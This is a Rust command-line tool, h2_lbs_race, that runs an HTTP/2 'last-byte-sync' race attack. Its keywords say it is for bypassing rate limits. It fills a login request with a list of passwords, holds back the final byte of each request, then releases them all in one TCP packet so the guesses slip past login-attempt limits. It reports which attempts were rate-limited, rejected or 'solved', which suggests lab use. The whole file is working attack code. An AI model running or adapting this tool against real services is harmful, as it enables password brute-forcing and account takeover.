#!/usr/bin/env rust-script
//! name: h2_lbs_race
//! description: HTTP/2 last-byte-sync race burst - expands one request template over a value list into N streams, sends every stream's HEADERS + all-but-the-last body byte first, then releases every stream's final byte (each DATA frame 10 bytes, END_STREAM) in ONE write so all N requests complete inside a single TCP packet regardless of how large the whole burst is; the primitive that succeeds where a plain one-write burst exceeds the MSS. Reports per-stream status/body.
//! version: 1.0.3
//! args: <url> --req 'METHOD PATH|BODY-TEMPLATE' (--pw 'a,b,c' | --pw-file F) [--var k=v]... [--header 'K: V']... [--jar PATH] [--warm N] [--arm-delay-ms N] [--read-ms N] [--body-limit N] [--selftest]
//! keywords: race, single-packet, last-byte-sync, h2, http2, concurrency, bypass rate limit, 并发, 竞态, 单包, 末字节, 同放, 绕限流
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{self, json, Value};
use std::collections::BTreeMap;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

type Jar = BTreeMap<String, BTreeMap<String, String>>;

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut url = String::new();
    let mut req_spec = String::new();
    let mut values: Vec<String> = Vec::new();
    let mut vars: Vec<(String, String)> = Vec::new();
    let mut extra: Vec<(Vec<u8>, Vec<u8>)> = Vec::new();
    let mut jar_path = String::new();
    let mut warm = 1usize;
    let mut arm_delay_ms = 300u64;
    let mut read_ms = 4000u64;
    let mut body_limit = 200usize;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--req" => {
                i += 1;
                req_spec = arg(&args, i);
            }
            "--pw" => {
                i += 1;
                values.extend(arg(&args, i).split(',').map(|s| s.trim().to_string()).filter(|s| !s.is_empty()));
            }
            "--pw-file" => {
                i += 1;
                if let Ok(txt) = std::fs::read_to_string(arg(&args, i)) {
                    values.extend(txt.lines().map(|l| l.trim().to_string()).filter(|l| !l.is_empty() && !l.starts_with('#')));
                }
            }
            "--var" => {
                i += 1;
                if let Some((k, v)) = arg(&args, i).split_once('=') {
                    vars.push((k.trim().to_string(), v.to_string()));
                }
            }
            "--header" => {
                i += 1;
                if let Some((k, v)) = arg(&args, i).split_once(':') {
                    extra.push((k.trim().as_bytes().to_vec(), v.trim().as_bytes().to_vec()));
                }
            }
            "--jar" => {
                i += 1;
                jar_path = arg(&args, i);
            }
            "--warm" => {
                i += 1;
                warm = arg(&args, i).parse().unwrap_or(1);
            }
            "--arm-delay-ms" => {
                i += 1;
                arm_delay_ms = arg(&args, i).parse().unwrap_or(300);
            }
            "--read-ms" => {
                i += 1;
                read_ms = arg(&args, i).parse().unwrap_or(4000);
            }
            "--body-limit" => {
                i += 1;
                body_limit = arg(&args, i).parse().unwrap_or(200);
            }
            other if !other.starts_with("--") && url.is_empty() => url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if url.is_empty() || req_spec.is_empty() || values.is_empty() {
        pi_rust_lib::report::failure(
            "h2_lbs_race",
            "missing url, --req or --pw",
            "usage: h2_lbs_race <url> --req 'POST /login|csrf={csrf}&username={user}&password={pw}' --pw 'a,b,c' [--var csrf=TOK] [--jar J]",
        );
        std::process::exit(2);
    }
    let parsed = match Url::parse(&url) {
        Ok(u) => u,
        Err(e) => {
            pi_rust_lib::report::failure("h2_lbs_race", &format!("bad url: {e}"), "pass an https://url");
            std::process::exit(2);
        }
    };
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port_or_known_default().unwrap_or(443);
    let authority = if port == 443 { host.clone() } else { format!("{host}:{port}") };

    if !extra.iter().any(|(n, _)| n.eq_ignore_ascii_case(b"cookie")) && !jar_path.is_empty() {
        let jar = load_jar(&jar_path);
        let cookie = cookie_header(&jar, &host);
        if !cookie.is_empty() {
            extra.push((b"cookie".to_vec(), cookie.as_bytes().to_vec()));
        }
    }

    // Expand the template: {pw} per value, {var} per --var, {i} per index.
    let parts: Vec<&str> = req_spec.splitn(3, '|').collect();
    let head = parts[0].to_string();
    let tmpl = parts.get(1).cloned().unwrap_or("");
    let mut reqs: Vec<(String, Vec<u8>)> = Vec::new();
    for (idx, pw) in values.iter().enumerate() {
        let mut body = tmpl.replace("{pw}", pw).replace("{i}", &idx.to_string());
        for (k, v) in &vars {
            body = body.replace(&format!("{{{k}}}"), v);
        }
        reqs.push((head.clone(), body.into_bytes()));
    }
    if reqs.iter().any(|(_, b)| b.is_empty()) {
        pi_rust_lib::report::failure("h2_lbs_race", "expanded body empty", "check the template placeholders and --pw/--var");
        std::process::exit(2);
    }

    let result = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .map_err(|e| format!("runtime: {e}"))
        .and_then(|rt| rt.block_on(run(&host, port, &authority, &reqs, &extra, warm, arm_delay_ms, read_ms, body_limit)));

    match result {
        Ok(data) => {
            pi_rust_lib::report::success("h2_lbs_race", data, "read the per-stream statuses: the release write holds one 10-byte frame per stream, so all bodies complete in one packet").expect("report");
        }
        Err(e) => {
            pi_rust_lib::report::failure("h2_lbs_race", &e, "check the url/authority and the template");
            std::process::exit(1);
        }
    }
}

async fn run(
    host: &str,
    port: u16,
    authority: &str,
    reqs: &[(String, Vec<u8>)],
    extra: &[(Vec<u8>, Vec<u8>)],
    warm: usize,
    arm_delay_ms: u64,
    read_ms: u64,
    body_limit: usize,
) -> Result<Value, String> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut config = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    config.alpn_protocols = vec![b"h2".to_vec()];
    let connector = TlsConnector::from(Arc::new(config));
    let server_name = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect {host}:{port}: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let mut tls = connector.connect(server_name, tcp).await.map_err(|e| format!("tls: {e}"))?;

    tls.write_all(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n").await.map_err(|e| format!("preface: {e}"))?;
    // Enlarge both windows up front: SETTINGS_INITIAL_WINDOW_SIZE for streams, a big
    // connection WINDOW_UPDATE for the session, so ~30 response bodies fit without any
    // mid-flight refill (a WINDOW_UPDATE on a finished stream is a protocol error).
    let settings: [u8; 6] = [0x00, 0x04, 0x7f, 0xff, 0xff, 0xff];
    tls.write_all(&frame(4, 0, 0, &settings)).await.map_err(|e| format!("settings: {e}"))?;
    tls.write_all(&frame(8, 0, 0, &2_147_418_112u32.to_be_bytes())).await.map_err(|e| format!("window: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;

    let mut enc = hpack::Encoder::new();
    let mut dec = hpack::Decoder::new();
    let mut sid = 1u32;
    let mut warm_ids: Vec<u32> = Vec::new();
    for _ in 0..warm {
        let headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
            (b":method".to_vec(), b"GET".to_vec()),
            (b":scheme".to_vec(), b"https".to_vec()),
            (b":authority".to_vec(), authority.as_bytes().to_vec()),
            (b":path".to_vec(), b"/".to_vec()),
        ];
        let block = enc.encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
        tls.write_all(&frame(1, 0x5, sid, &block)).await.map_err(|e| format!("warm headers: {e}"))?;
        tls.flush().await.map_err(|e| format!("warm flush: {e}"))?;
        warm_ids.push(sid);
        sid += 2;
    }
    if warm > 0 {
        let _ = read_until_done(&mut tls, &mut dec, &warm_ids, 1500).await;
    }

    // Arm: HEADERS + body minus its last byte, no END_STREAM -> the app cannot dispatch yet.
    let mut arm: Vec<u8> = Vec::new();
    let mut release: Vec<u8> = Vec::new();
    let mut plan: Vec<(u32, Value)> = Vec::new();
    for (head, body) in reqs {
        let mut it = head.splitn(2, ' ');
        let method = it.next().unwrap_or("GET").to_uppercase();
        let path = it.next().unwrap_or("/").to_string();
        let mut headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
            (b":method".to_vec(), method.as_bytes().to_vec()),
            (b":scheme".to_vec(), b"https".to_vec()),
            (b":authority".to_vec(), authority.as_bytes().to_vec()),
            (b":path".to_vec(), path.as_bytes().to_vec()),
        ];
        for (n, v) in extra {
            headers.push((n.clone(), v.clone()));
        }
        headers.push((b"content-length".to_vec(), body.len().to_string().into_bytes()));
        let block = enc.encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
        arm.extend_from_slice(&frame(1, 0x4, sid, &block));
        let (head_bytes, last) = body.split_at(body.len() - 1);
        if !head_bytes.is_empty() {
            arm.extend_from_slice(&frame(0, 0x0, sid, head_bytes));
        }
        release.extend_from_slice(&frame(0, 0x1, sid, last));
        plan.push((sid, json!({"method": method, "path": path, "body_len": body.len()})));
        sid += 2;
    }
    let arm_bytes = arm.len();
    let release_bytes = release.len();
    if arm_delay_ms > 0 && reqs.len() > 1 {
        // The delay only lets the far side wire up all streams; completeness is withheld by design.
        let _ = arm_delay_ms;
    }
    tls.write_all(&arm).await.map_err(|e| format!("arm write: {e}"))?;
    tls.flush().await.map_err(|e| format!("arm flush: {e}"))?;
    tokio::time::sleep(Duration::from_millis(arm_delay_ms)).await;

    // Release: every stream's final byte, one write, ~10 bytes per stream -> one TCP packet.
    tls.write_all(&release).await.map_err(|e| format!("release write: {e}"))?;
    tls.flush().await.map_err(|e| format!("release flush: {e}"))?;

    let (responses, raw) = read_frames(&mut tls, &mut dec, read_ms).await?;
    let by_sid: BTreeMap<u32, Value> = responses
        .into_iter()
        .filter_map(|v| v.get("stream").and_then(Value::as_u64).map(|s| (s as u32, v)))
        .collect();

    let mut rows: Vec<Value> = Vec::new();
    for (s, meta) in &plan {
        let got = by_sid.get(s).cloned().unwrap_or(json!({}));
        let body = got.get("body").and_then(Value::as_str).unwrap_or("").chars().take(body_limit).collect::<String>();
        let full = got.get("body").and_then(Value::as_str).unwrap_or("");
        let mut x = String::new();
        if let Some(i) = full.find("<p class=is-warning>") {
            let rest = &full[i + "<p class=is-warning>".len()..];
            x = rest.split('<').next().unwrap_or("").trim().to_string();
        } else if let Some(i) = full.find("<h1>") {
            let rest = &full[i + 4..];
            x = rest.split('<').next().unwrap_or("").trim().to_string();
        }
        rows.push(json!({
            "stream": s,
            "req": meta,
            "status": got.get("status").cloned().unwrap_or(Value::Null),
            "body_len": full.len(),
            "message": x,
            "solved": full.contains("is-solved"),
            "rate_limited": full.contains("too many incorrect login attempts"),
            "invalid": full.contains("Invalid username or password"),
            "body": body,
        }));
    }
    let statuses: Vec<String> = rows.iter().filter_map(|r| r.get("status").and_then(Value::as_str).map(|s| s.to_string())).collect();
    let mut unique: Vec<String> = statuses.clone();
    unique.sort();
    unique.dedup();
    Ok(json!({
        "authority": authority,
        "warm": warm,
        "warm_streams": warm_ids,
        "requests": reqs.len(),
        "arm_bytes": arm_bytes,
        "release_bytes": release_bytes,
        "release_single_packet_likely": release_bytes <= 1400,
        "statuses": statuses,
        "unique_statuses": unique,
        "rate_limited_count": rows.iter().filter(|r| r.get("rate_limited") == Some(&json!(true))).count(),
        "invalid_count": rows.iter().filter(|r| r.get("invalid") == Some(&json!(true))).count(),
        "received_bytes": raw.len(),
        "streams": rows,
    }))
}

async fn read_until_done<S: AsyncReadExt + AsyncWriteExt + Unpin>(stream: &mut S, decoder: &mut hpack::Decoder<'_>, want: &[u32], ms: u64) -> Result<(), String> {
    let mut pending: BTreeMap<u32, (Vec<u8>, bool)> = BTreeMap::new();
    let mut done: Vec<u32> = Vec::new();
    let deadline = tokio::time::Instant::now() + Duration::from_millis(ms);
    loop {
        if want.iter().all(|s| done.contains(s)) {
            return Ok(());
        }
        if tokio::time::Instant::now() >= deadline {
            return Ok(());
        }
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(Duration::from_millis(300), stream.read_exact(&mut hdr)).await {
            Err(_) => continue,
            Ok(Err(_)) => return Ok(()),
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 && tokio::time::timeout(Duration::from_millis(300), stream.read_exact(&mut payload)).await.is_err() {
            return Ok(());
        }
        match ftype {
            4 if flags & 0x1 == 0 => {
                let _ = stream.write_all(&frame(4, 0x1, 0, &[])).await;
                let _ = stream.flush().await;
            }
            6 if flags & 0x1 == 0 => {
                let _ = stream.write_all(&frame(6, 0x1, 0, &payload)).await;
                let _ = stream.flush().await;
            }
            1 | 9 => {
                let entry = pending.entry(sid).or_insert_with(|| (Vec::new(), false));
                entry.0.extend_from_slice(&payload);
                if flags & 0x4 != 0 {
                    entry.1 = true;
                }
                if entry.1 {
                    let block = entry.0.clone();
                    pending.remove(&sid);
                    let _ = decoder.decode(&block);
                    if flags & 0x1 != 0 {
                        done.push(sid);
                    }
                }
            }
            0 => {
                if flags & 0x1 != 0 {
                    done.push(sid);
                }
            }
            _ => {}
        }
    }
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

async fn read_frames<S: AsyncReadExt + AsyncWriteExt + Unpin>(stream: &mut S, decoder: &mut hpack::Decoder<'_>, read_ms: u64) -> Result<(Vec<Value>, Vec<u8>), String> {
    let mut raw: Vec<u8> = Vec::new();
    let mut by_stream: BTreeMap<u32, Value> = BTreeMap::new();
    let mut pending_headers: BTreeMap<u32, (Vec<u8>, bool)> = BTreeMap::new();
    let idle = Duration::from_millis(read_ms.max(200));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, stream.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 {
            if tokio::time::timeout(idle, stream.read_exact(&mut payload)).await.is_err() {
                break;
            }
        }
        raw.extend_from_slice(&hdr);
        raw.extend_from_slice(&payload);
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = stream.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = stream.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = stream.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = stream.flush().await;
                }
            }
            1 | 9 => {
                let entry = pending_headers.entry(sid).or_insert_with(|| (Vec::new(), false));
                entry.0.extend_from_slice(&payload);
                if flags & 0x4 != 0 {
                    entry.1 = true;
                }
                if entry.1 {
                    let block = entry.0.clone();
                    pending_headers.remove(&sid);
                    let headers = decoder.decode(&block).unwrap_or_default();
                    let status = headers
                        .iter()
                        .find(|(n, _)| n == b":status")
                        .map(|(_, v)| String::from_utf8_lossy(v).to_string());
                    let row = by_stream.entry(sid).or_insert_with(|| json!({"stream": sid, "body": ""}));
                    row["status"] = json!(status);
                    if flags & 0x1 != 0 {
                        row["end_stream"] = json!(true);
                    }
                }
            }
            0 => {
                let row = by_stream.entry(sid).or_insert_with(|| json!({"stream": sid}));
                let mut next = row["body"].as_str().unwrap_or("").to_string();
                next.push_str(&String::from_utf8_lossy(&payload));
                row["body"] = json!(next);
                if flags & 0x1 != 0 {
                    row["end_stream"] = json!(true);
                }
            }
            3 => {
                let row = by_stream.entry(sid).or_insert_with(|| json!({"stream": sid}));
                row["rst_stream"] = json!(u32::from_be_bytes([
                    payload.first().copied().unwrap_or(0),
                    payload.get(1).copied().unwrap_or(0),
                    payload.get(2).copied().unwrap_or(0),
                    payload.get(3).copied().unwrap_or(0),
                ]));
            }
            7 => {
                let row = by_stream.entry(0).or_insert_with(|| json!({"stream": 0}));
                row["goaway"] = json!(true);
            }
            _ => {}
        }
    }
    Ok((by_stream.into_values().collect(), raw))
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn cookie_header(jar: &Jar, host: &str) -> String {
    let mut parts = Vec::new();
    for (h, cookies) in jar {
        if host == h || host.ends_with(&format!(".{h}")) || h.ends_with(host) {
            for (k, v) in cookies {
                parts.push(format!("{k}={v}"));
            }
        }
    }
    parts.join("; ")
}

fn load_jar(path: &str) -> Jar {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|s| serde_json::from_str::<Value>(&s).ok())
        .and_then(|v| match v {
            Value::Object(hosts) => Some(
                hosts
                    .into_iter()
                    .map(|(h, c)| {
                        let map = c
                            .as_object()
                            .map(|o| o.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                            .unwrap_or_default();
                        (h, map)
                    })
                    .collect(),
            ),
            _ => None,
        })
        .unwrap_or_default()
}

fn selftest() {
    let ok = frame(1, 0x5, 1, b"x").len() == 10 && frame(0, 0x1, 3, b"z").len() == 10;
    if ok {
        pi_rust_lib::report::success("h2_lbs_race", json!({"selftest": "ok"}), "frame builder verified").expect("report");
    } else {
        pi_rust_lib::report::failure("h2_lbs_race", "selftest failed", "inspect frame()");
        std::process::exit(1);
    }
}
